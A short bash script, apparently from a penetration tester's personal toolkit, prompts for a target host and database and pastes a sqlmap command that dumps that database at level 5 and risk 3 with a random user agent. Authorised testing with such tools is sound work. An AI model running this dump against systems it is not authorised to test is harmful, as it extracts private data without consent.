#!/bin/bash

: '
sqlmap show all databases
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "IP/domain" "DB"

HOST=${form_data["IP/domain"]}
DB=${form_data["DB"]}

paste_command "sqlmap -u ${HOST} -D ${DB} --dump --random-agent --level 5 --risk 3 --batch"
